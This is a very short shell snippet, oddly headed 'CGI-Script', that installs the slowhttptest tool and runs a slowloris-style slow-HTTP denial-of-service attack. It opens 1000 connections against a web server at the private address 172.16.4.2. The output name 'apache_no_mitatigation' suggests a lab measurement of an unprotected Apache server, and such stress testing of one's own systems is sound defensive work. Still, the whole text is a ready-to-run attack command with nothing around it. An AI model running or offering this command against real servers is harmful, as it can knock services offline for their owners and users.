#CGI-Script
sudo apt-get install slowhttptest
sudo slowhttptest -c 1000 -H -g -o apache_no_mitatigation -i 10 -r 2 -t GET -u http://172.16.4.2 -x 24 -p 3 -l 123 < /dev/null